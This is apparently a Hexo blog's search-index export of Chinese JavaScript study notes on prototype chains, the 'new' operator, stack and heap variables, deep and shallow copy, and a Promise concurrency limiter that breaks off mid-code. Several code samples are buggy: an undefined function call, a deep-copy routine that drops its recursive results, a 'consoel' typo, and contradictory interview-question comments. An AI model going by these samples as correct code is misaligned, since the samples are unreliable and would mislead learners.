-&gt; [[PUT]] =&gt; 基本类型(自身创建覆盖) =&gt; A &#123; n: 4 &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title function_">A</span>()</span><br><span class="line">a.<span class="title function_">add1</span>();</span><br><span class="line"><span class="comment">/** 分析 通过点(.)的方式调用函数会绑定this</span></span><br><span class="line"><span class="comment"> * (1). a.add1 -&gt; 属于RHS: 读操作，获取a.add1的返回值</span></span><br><span class="line"><span class="comment"> * (2). RHS -&gt; [[GET]] -&gt; a.[[__proto__]] -&gt; A.prototype.[[__proto__]]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">b.<span class="title function_">add1</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">n</span>, b.<span class="property">n</span>, c.<span class="property">n</span>); <span class="comment">// 4, 4, 3</span></span><br></pre></td></tr></table></figure><h3 id="面试题-02"><a href="#面试题-02" class="headerlink" title="面试题 - 02"></a>面试题 - 02</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">A</span> () &#123;&#125;;</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">m</span> = &#123;</span><br><span class="line">    <span class="attr">t</span>: <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add2</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">m</span> = &#123;&#125;;    <span class="comment">// 写操作 =&gt; 对引用对象的引用 =&gt; 覆盖 =&gt; d &#123; m: &#123;&#125;, prototype: Object &#123; add2: f(), m: &#123;t: 1&#125;&#125;&#125;</span></span><br><span class="line">    <span class="comment">// LHS -&gt; [[PUT]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line">d.<span class="title function_">add2</span>(); <span class="comment">// RHS =&gt; [[GET]] -&gt; d.[[__proto__]] -&gt; A.prototype</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d.<span class="property">m</span>.<span class="property">t</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h3 id="面试题-03"><a href="#面试题-03" class="headerlink" title="面试题 - 03"></a>面试题 - 03</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">eat</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(age + <span class="string">&quot;岁的&quot;</span> + name + <span class="string">&quot;在吃饭.&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>.<span class="property">run</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">walk</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;jsliang&#x27;</span>, <span class="number">24</span>);</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;jsliang&#x27;</span>, <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象的引用的值判断 -&gt; 判断地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">eat</span> === p2.<span class="property">eat</span>); <span class="comment">// false =&gt; new的时候指向不同的地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">run</span> === p2.<span class="property">run</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">walk</span> === p2.<span class="property">walk</span>);   <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="面试题-04"><a href="#面试题-04" class="headerlink" title="面试题 - 04"></a>面试题 - 04</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">some</span> = <span class="string">&#x27;222&#x27;</span>;  <span class="comment">// 能访问到</span></span><br><span class="line">    <span class="keyword">let</span> ccc = <span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">    foo.<span class="property">obkorou1</span>= <span class="string">&#x27;obkorou1&#x27;</span>;</span><br><span class="line">    foo.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">a</span> = <span class="string">&#x27;aaa&#x27;</span>;    <span class="comment">// 能访问到</span></span><br><span class="line">&#125;</span><br><span class="line">foo.<span class="property">koro</span> = <span class="string">&#x27;扣肉&#x27;</span>;</span><br><span class="line">foo.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">test</span> = <span class="string">&#x27;test&#x27;</span> <span class="comment">// 被修改</span></span><br><span class="line"><span class="keyword">let</span> foo1 = <span class="keyword">new</span> <span class="title function_">foo</span>();</span><br><span class="line">foo.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">test</span> = <span class="string">&#x27;test2&#x27;</span>;   <span class="comment">// 能访问到</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// foo1 访问到哪些属性?</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型链</title>
      <link href="/bf8cf30.html"/>
      <url>/bf8cf30.html</url>
      
        <content type="html"><![CDATA[<div class="note message"><p><strong>理解原型链</strong></p><ol><li>理解<code>new</code>关键字的作用机制（写）</li><li>理解[[GET]]（读）</li></ol></div><span id="more"></span><h2 id="new的执行流程"><a href="#new的执行流程" class="headerlink" title="new的执行流程"></a>new的执行流程</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title function_">foo</span>(); <span class="comment">// 第二步用代码表示：this.__proto__ = foo.prototype； 返回值：this指向的对象的引用</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br></pre></td></tr></table></figure><div class="note info"><p><strong>new的执行流程</strong></p><ol><li>绑定this为空对象</li><li>让空对象<code>[[Prototype]](__protot__)</code> –&gt; 函数的<code>prototype</code>属性<br>  (1) 所有对象都有<code>[[Prototype]](隐式属性 __protot__)</code> -&gt; 所有对象本质上都是new出来的<br>  (2) 所有的函数对象 -&gt; prototype</li><li>正常执行函数</li><li>如果函数返回的基本类型，返回this的值，否则返回原函数的返回值</li></ol></div><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://i.328888.xyz/2023/04/17/izUScq.png' data-fancybox='default' data-caption='new执行流程图解'><img fancybox itemprop="contentUrl" src="https://i.328888.xyz/2023/04/17/izUScq.png" class="lazyload" data-srcset="https://i.328888.xyz/2023/04/17/izUScq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="new执行流程图解"></a><span class='image-caption'>new执行流程图解</span></div></div><h2 id="GET"><a href="#GET" class="headerlink" title="[[GET]]"></a><code>[[GET]]</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title function_">foo</span>(); </span><br><span class="line">a.<span class="property">b</span>                   <span class="comment">// 不报错返回undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">b</span>)      <span class="comment">// 访问对象属性的本质，底层帮调用</span></span><br></pre></td></tr></table></figure><div class="note info"><p><strong>[[GET]]流程</strong></p><ol><li>判断对象里面有没有</li><li>判断它的__proto__指向的对象里面有没有</li></ol></div><h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">a</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">b</span>  = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> F = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>) &#123; &#125;;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="property">a</span>)  <span class="comment">// 打印a</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="property">a</span>)  <span class="comment">// 打印undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(F.<span class="property">a</span>)  <span class="comment">// 打印a</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(F.<span class="property">b</span>)  <span class="comment">// 打印b</span></span><br></pre></td></tr></table></figure><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://i.328888.xyz/2023/04/19/i6E8WA.png' data-fancybox='default' data-caption='原型链面试题图解'><img fancybox itemprop="contentUrl" src="https://i.328888.xyz/2023/04/19/i6E8WA.png" class="lazyload" data-srcset="https://i.328888.xyz/2023/04/19/i6E8WA.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="原型链面试题图解"></a><span class='image-caption'>原型链面试题图解</span></div></div><div class="note info"><p><strong></strong></p><p>原型链的终点是：Object.prototype.[[prototype]] &#x3D; null</p><ul><li>Object.prototype.<code>__proto__</code> &#x3D; null;  &#x2F;&#x2F; 不是所有对象都是Object的实例</li><li>Function.prototype._<code>_proto__</code> &#x3D; Object.prototype;  &#x2F;&#x2F; new Object()</li><li>Object.<code>__proto__</code> &#x3D; Function.prototype;  &#x2F;&#x2F; new Funtion()</li><li>Function.<code>__proto__</code> &#x3D; Function.prototype</li></ul></div>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量</title>
      <link href="/13ffbe88.html"/>
      <url>/13ffbe88.html</url>
      
        <content type="html"><![CDATA[<div class="note todo"><p><strong></strong></p><ol><li>变量的本质</li><li>深拷贝</li><li>垃圾回收</li></ol></div><span id="more"></span><h2 id="变量的本质"><a href="#变量的本质" class="headerlink" title="变量的本质"></a>变量的本质</h2><div class="note bug"><p><strong>栈(stack)的特性</strong></p><ol><li>结构性强，内存连续</li><li>寻址速度快</li><li>数据稳定</li><li>容量小</li></ol></div><div class="note warning"><p><strong>原始类型</strong></p><ol><li>原始类型存于栈中</li><li>原始类型<u>不可修改</u>; 无法<u>直接修改指向内存中的值</u>, 需要新开辟一块内存</li></ol><table><thead><tr><th>类型</th><th>typeof返回值</th><th>对象包装器</th></tr></thead><tbody><tr><td>Null</td><td>“object”</td><td>N&#x2F;A</td></tr><tr><td>Undefined</td><td>“undefined”</td><td>N&#x2F;A</td></tr><tr><td>Boolean</td><td>“boolean”</td><td>Boolean</td></tr><tr><td>Number</td><td>“number”</td><td>Number</td></tr><tr><td>BigInt</td><td>“bigint”</td><td>BigInt</td></tr><tr><td>String</td><td>“string”</td><td>String</td></tr><tr><td>Symbol</td><td>“symbol”</td><td>Symbol</td></tr></tbody></table></div><hr><div class="note bug"><p><strong>堆(heap)的特性</strong></p><ol><li>类似于书架</li><li>存储以坨为单位</li><li>容量大</li><li>不同数据间内存不连续</li></ol></div><div class="note warning"><p><strong>引用类型</strong></p><ol><li>在js中引用类型指的是对象（Object）;</li></ol></div><h3 id="示例代码-01"><a href="#示例代码-01" class="headerlink" title="示例代码-01"></a>示例代码-01</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> </span><br><span class="line">    b1 = <span class="number">1</span>,</span><br><span class="line">    b2 = b1;    <span class="comment">// RHS right head-side search 右查询（本质：读了内存中存的值）</span></span><br><span class="line">b2 = b1;    <span class="comment">// 本质是在内存中指向了新的数据（2），旧数据（1）将被回收</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b1, b2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> </span><br><span class="line">    r1 = &#123;</span><br><span class="line">        <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    r2 = r1;    <span class="comment">// 程序本身只允许访问栈，无法访问堆；栈和堆通过标识符建立连接</span></span><br><span class="line"></span><br><span class="line">r2.<span class="property">a</span> = <span class="number">2</span>;   <span class="comment">// 因为r1和r2同时指向了堆中的数据，所以修改r2，r1随之改变</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(r1.<span class="property">a</span>, r2.<span class="property">a</span>)</span><br></pre></td></tr></table></figure><hr><div class="note warning"><p><strong>字符串(特殊)</strong></p><p>字符串本质上是存放在堆中，但是它是一个原始类型，原始类型不能直接修改栈中的数据，而是新建了一个标识符并指向了堆中的新数据</p></div><h3 id="示例代码-02"><a href="#示例代码-02" class="headerlink" title="示例代码-02"></a>示例代码-02</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">&#x27;hello word&#x27;</span>,</span><br><span class="line">    b = a;</span><br><span class="line">b = <span class="string">&#x27;hello&#x27;</span>;    <span class="comment">// 栈中会新建标识符指向新数据，旧数据则被回收</span></span><br><span class="line">consoel.<span class="title function_">log</span>(a, b);</span><br></pre></td></tr></table></figure><h3 id="变量总结"><a href="#变量总结" class="headerlink" title="变量总结"></a>变量总结</h3><div class="note success"><p><strong>知识总结</strong></p><ol><li>数据组织的方式不同 – 栈中的内存是连续的，堆中不是</li><li>用户权限不同 – 用户能读取栈中的数据不能读取堆中的数据</li><li>大小不同 – 栈的空间小堆的空间大</li><li>寻址速度不同 – 栈的寻址速度快而堆的寻址速度慢</li><li>作用不同 – 栈中存的是基本类型、引用类型的标识符以及字符串的标识符；堆中存放大小不确定的数据</li></ol></div><h2 id="值传递和引用传递"><a href="#值传递和引用传递" class="headerlink" title="值传递和引用传递"></a>值传递和引用传递</h2><div class="note info"><p><strong></strong></p><p>所谓的引用传递取决于传递的是值还是地址；在javascript中本质上就是值传递（读栈<code>stack</code>内存中的值）</p></div><h3 id="示例代码-01-1"><a href="#示例代码-01-1" class="headerlink" title="示例代码-01"></a>示例代码-01</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">change1</span>(<span class="params">arg</span>) &#123;</span><br><span class="line">    arg = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">change2</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">    arg.<span class="property">a</span> = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> bar = &#123; <span class="attr">a</span>: <span class="number">100</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">change1</span>(foo);</span><br><span class="line"><span class="title function_">change2</span>(bar);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo, bar);</span><br></pre></td></tr></table></figure><h2 id="深拷贝-浅拷贝"><a href="#深拷贝-浅拷贝" class="headerlink" title="深拷贝&amp;浅拷贝"></a>深拷贝&amp;浅拷贝</h2><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">    <span class="attr">age</span>: <span class="number">28</span>,</span><br><span class="line">    <span class="attr">hobby</span>: <span class="string">&#x27;学习&#x27;</span>,</span><br><span class="line">    <span class="attr">son</span>: &#123;</span><br><span class="line">        <span class="attr">age</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="attr">hobby</span>: <span class="string">&#x27;drink milk&#x27;</span>,</span><br><span class="line">        <span class="attr">friends</span>: [<span class="string">&#x27;jack&#x27;</span>, <span class="string">&#x27;lucy&#x27;</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浅拷贝</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clone2</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> clonePerson = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        clonePerson[key] = obj[key];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clonePerson;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newPerson = <span class="title function_">clonePerson</span>(person1);</span><br><span class="line">newPerson.<span class="property">age</span> = <span class="number">18</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">age</span>);</span><br><span class="line">newPerson.<span class="property">son</span>.<span class="property">age</span> = <span class="number">100</span>;    <span class="comment">// 会改变，son是一个object属于引用类型存放于堆中，newPerson.son和person1.son指向同一个</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newPerson.<span class="property">son</span>.<span class="property">age</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用递归实现深拷贝</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clone2</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> obj !== <span class="string">&#x27;object&#x27;</span> || obj === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> clone = <span class="title class_">Array</span>.<span class="title function_">isArray</span>(obj) ? [] : &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_">clone2</span>(obj[key])</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            clone[key] = obj[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h2><div class="note info"><p><strong></strong></p><ol><li>stack存储基本变量和引用类型的指向;</li><li>heap存储复杂数据和字符串;</li><li>stack会自动回收,<br>heap借助垃圾回收机制进行回收，但需要一定的手动操作;</li></ol></div><h2 id="视频地址"><a href="#视频地址" class="headerlink" title="视频地址"></a>视频地址</h2><div class="tag link"><a class="link-card" title="变量的本质&深拷贝&垃圾回收" href="https://www.bilibili.com/video/BV1Ed4y1x7oN/?p=6&spm_id_from=pageDriver&vd_source=cb73e5c2249f330a061d8900da3573a8"><div class="left"><img src="https://gcore.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">变量的本质&深拷贝&垃圾回收</p><p class="url">https://www.bilibili.com/video/BV1Ed4y1x7oN/?p=6&spm_id_from=pageDriver&vd_source=cb73e5c2249f330a061d8900da3573a8</p></div></a></div>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise异步任务并发</title>
      <link href="/5d76cec.html"/>
      <url>/5d76cec.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>背景</strong></p><p>设计一个方法doSomething来限制异步任务的最大并发数</p></div><span id="more"></span><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span> (<span class="attr">timeout</span>: <span class="built_in">number</span>, <span class="attr">taskName</span>: <span class="built_in">string</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>&lt;<span class="built_in">void</span>&gt;(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;taskName&#125;</span>开始啦`</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;taskName&#125;</span>结束啦`</span>);</span><br><span class="line">            <span class="title function_">resolve</span>();</span><br><span class="line">        &#125;, timeout)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tasks = [</span><br><span class="line">    <span class="function">() =&gt;</span> <span class="title function_">sleep</span>(<span class="number">1000</span>, <span class="string">&#x27;睡觉&#x27;</span>),</span><br><span class="line">    <span class="function">() =&gt;</span> <span class="title function_">sleep</span>(<span class="number">2000</span>, <span class="string">&#x27;吃饭&#x27;</span>),</span><br><span class="line">    <span class="function">() =&gt;</span> <span class="title function_">sleep</span>(<span class="number">3000</span>, <span class="string">&#x27;打游戏&#x27;</span>),</span><br><span class="line">    <span class="function">() =&gt;</span> <span class="title function_">sleep</span>(<span class="number">5000</span>, <span class="string">&#x27;写代码&#x27;</span>),</span><br><span class="line">    <span class="function">() =&gt;</span> <span class="title function_">sleep</span>(<span class="number">7000</span>, <span class="string">&#x27;做运动&#x27;</span>),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params">tasks:(()=&gt;<span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;)[], limit=<span class="number">2</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 正在执行中的任务的集合</span></span><br><span class="line">    <span class="keyword">const</span> taskPool = <span class="keyword">new</span> <span class="title 